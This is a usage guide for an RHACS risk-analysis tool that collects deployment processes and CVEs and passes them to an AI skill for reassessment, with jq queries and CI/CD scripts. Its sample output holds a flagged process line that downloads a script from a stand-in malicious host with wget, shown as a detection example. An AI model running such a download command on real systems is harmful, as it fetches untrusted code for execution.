# RHACS Risk Analysis - Usage Guide

## Quick Start

### 1. List Available Deployments

```bash
python3 rhacs_analyzer.py list | jq -r '.[] | "\(.id) - \(.name) (cluster: \(.cluster), priority: \(.priority))"'
```

Example output:
```
83d64f14-3784-4a45-b12e-606cd323639d - shaggy (cluster: staging-secured-cluster, priority: 130)
819a708b-b08d-4042-b04d-4aca47b546af - collector (cluster: staging-central-cluster, priority: 76)
```

### 2. Analyze a Deployment (Data Collection Only)

```bash
python3 rhacs_analyzer.py analyze 83d64f14-3784-4a45-b12e-606cd323639d > deployment_data.json
```

This fetches all deployment data including:
- Deployment metadata
- Risk score and risk results
- Process executions (grouped by container)
- Image vulnerabilities (CVEs)
- Process baselines

### 3. AI-Powered Risk Assessment (Using Claude Code Skill)

```bash
/rhacs-risk-analysis 83d64f14-3784-4a45-b12e-606cd323639d
```

This will:
1. Run the analyzer to fetch deployment data
2. Analyze each suspicious process for actual risk level
3. Reassess CVEs for applicability in the runtime environment
4. Calculate an overall Gen AI Priority Score
5. Generate `risk.json` with comprehensive analysis

## Understanding the Output

### Deployment Data (deployment_data.json)

After running the analyzer, you get a JSON file with:

```json
{
  "deploymentId": "83d64f14-3784-4a45-b12e-606cd323639d",
  "deploymentName": "shaggy",
  "namespace": "default",
  "cluster": "f781e077-fb39-4529-a19d-7a3403e181b2",
  "clusterName": "staging-secured-cluster",
  "originalRiskScore": 31.05,
  
  "suspiciousProcessExecutions": [
    {
      "containerName": "nginx",
      "processName": "/usr/bin/awk",
      "processExecFilePath": "/usr/bin/awk",
      "processArgs": "END { for (name in ENVIRON) { print name } }",
      "processUid": 0,
      "timesExecuted": 1,
      "suspicious": false,
      "parentExecFilePath": "/docker-entrypoint.sh"
    }
  ],
  
  "imageVulnerabilities": [
    {
      "cve": "CVE-2019-1010022",
      "severity": "LOW_VULNERABILITY_SEVERITY",
      "cvss": 9.8,
      "cvssVector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "component": "libc6",
      "componentVersion": "2.41-12+deb13u2",
      "fixedBy": "",
      "link": "https://nvd.nist.gov/vuln/detail/CVE-2019-1010022",
      "summary": "..."
    }
  ]
}
```

### AI-Enhanced Risk Assessment (risk.json)

After Claude analyzes the deployment:

```json
{
  "deploymentId": "...",
  "deploymentName": "...",
  
  "genAIPriority": 75,
  "genAIPriorityExplanation": "High priority due to critical CVEs in network-exposed service...",
  
  "suspiciousProcessExecutions": [
    {
      "processName": "wget",
      "processArgs": "wget http://malicious.com/script.sh",
      "genAIClassification": "HIGH",
      "genAIExplanation": "Process attempts to download from external source. This is highly suspicious as wget should not be running in a production nginx container..."
    }
  ],
  
  "imageVulnerabilities": [
    {
      "cve": "CVE-2024-1234",
      "cvss": 9.8,
      "component": "openssl",
      "genAIUpdatedCVSS": 7.5,
      "genAIMessage": "CVSS reduced from 9.8 to 7.5 because the vulnerability requires network access to port 443, but this deployment only exposes port 80. Attack complexity increased from LOW to HIGH."
    }
  ],
  
  "recommendations": [
    "Update openssl component to version 1.1.1k or later",
    "Investigate and remove suspicious wget process execution",
    "Consider implementing network policies to restrict egress traffic"
  ]
}
```

## Example Queries

### Find deployments with high risk scores

```bash
python3 rhacs_analyzer.py list | jq '.[] | select(.priority | tonumber > 100) | {name, priority, cluster}'
```

### Analyze multiple deployments

```bash
for id in $(python3 rhacs_analyzer.py list | jq -r '.[0:5] | .[].id'); do
  echo "Analyzing $id..."
  python3 rhacs_analyzer.py analyze "$id" > "analysis_${id}.json"
done
```

### Find high-severity unfixed CVEs

```bash
cat deployment_data.json | jq '[.imageVulnerabilities[] | select(.cvss >= 7.0 and .fixedBy == "")] | group_by(.component) | map({component: .[0].component, cves: length, max_cvss: map(.cvss) | max})'
```

Output:
```json
[
  {
    "component": "libc6",
    "cves": 5,
    "max_cvss": 9.8
  },
  {
    "component": "libssl3",
    "cves": 2,
    "max_cvss": 8.1
  }
]
```

### Find processes running as root

```bash
cat deployment_data.json | jq '[.suspiciousProcessExecutions[] | select(.processUid == 0)] | length'
```

### Compare deployments by risk

```bash
python3 rhacs_analyzer.py list | jq -r 'sort_by(.priority | tonumber) | reverse | .[] | "\(.priority)\t\(.name)\t\(.cluster)"' | column -t
```

## Integration with CI/CD

You can use this in your CI/CD pipeline:

```bash
#!/bin/bash
# check-deployment-risk.sh

DEPLOYMENT_ID=$1
THRESHOLD=80

# Fetch data
python3 rhacs_analyzer.py analyze "$DEPLOYMENT_ID" > deployment_data.json

# Check for critical CVEs
CRITICAL_COUNT=$(jq '[.imageVulnerabilities[] | select(.cvss >= 9.0)] | length' deployment_data.json)

if [ "$CRITICAL_COUNT" -gt 0 ]; then
  echo "FAIL: Found $CRITICAL_COUNT critical CVEs (CVSS >= 9.0)"
  exit 1
fi

echo "PASS: No critical CVEs found"
exit 0
```

## Advanced Workflows

### 1. Generate Risk Report for All Deployments

```bash
#!/bin/bash
# generate-risk-report.sh

echo "Deployment,Risk Score,High CVEs,Processes,Cluster" > risk_report.csv

python3 rhacs_analyzer.py list | jq -c '.[]' | while read -r deployment; do
  ID=$(echo "$deployment" | jq -r '.id')
  NAME=$(echo "$deployment" | jq -r '.name')
  CLUSTER=$(echo "$deployment" | jq -r '.cluster')
  PRIORITY=$(echo "$deployment" | jq -r '.priority')
  
  python3 rhacs_analyzer.py analyze "$ID" 2>/dev/null > "temp_$ID.json"
  
  HIGH_CVES=$(jq '[.imageVulnerabilities[] | select(.cvss >= 7.0)] | length' "temp_$ID.json")
  PROCESSES=$(jq '.suspiciousProcessExecutions | length' "temp_$ID.json")
  
  echo "$NAME,$PRIORITY,$HIGH_CVES,$PROCESSES,$CLUSTER" >> risk_report.csv
  rm "temp_$ID.json"
done

cat risk_report.csv | column -t -s,
```

### 2. Monitor for New Suspicious Processes

```bash
#!/bin/bash
# monitor-processes.sh

DEPLOYMENT_ID=$1
BASELINE_FILE="baseline_${DEPLOYMENT_ID}.json"

python3 rhacs_analyzer.py analyze "$DEPLOYMENT_ID" > current.json

if [ -f "$BASELINE_FILE" ]; then
  BASELINE_PROCS=$(jq '[.suspiciousProcessExecutions[].processName] | sort | unique' "$BASELINE_FILE")
  CURRENT_PROCS=$(jq '[.suspiciousProcessExecutions[].processName] | sort | unique' current.json)
  
  NEW_PROCS=$(jq -n --argjson baseline "$BASELINE_PROCS" --argjson current "$CURRENT_PROCS" \
    '$current - $baseline')
  
  if [ "$(echo "$NEW_PROCS" | jq 'length')" -gt 0 ]; then
    echo "WARNING: New processes detected: $NEW_PROCS"
  fi
else
  cp current.json "$BASELINE_FILE"
  echo "Baseline created"
fi

rm current.json
```

## Troubleshooting

### Connection Errors

If you get SSL or connection errors:

```bash
# Check API connectivity
curl -k -H "Authorization: Bearer $API_TOKEN" \
  https://staging.demo.stackrox.com/v1/deployments | jq '.deployments | length'
```

### No Data Returned

Some deployments may be inactive or have no runtime data:

```bash
# Check if deployment is active
python3 rhacs_analyzer.py fetch $DEPLOYMENT_ID | jq '{inactive, name, created}'
```

### Rate Limiting

If making many requests, add delays:

```bash
for id in $DEPLOYMENT_IDS; do
  python3 rhacs_analyzer.py analyze "$id" > "analysis_$id.json"
  sleep 1  # Add 1 second delay between requests
done
```

## Next Steps

1. Run AI analysis on high-priority deployments: `/rhacs-risk-analysis <deployment-id>`
2. Review the Gen AI reassessments in `risk.json`
3. Act on high-priority recommendations
4. Set up monitoring for your critical deployments
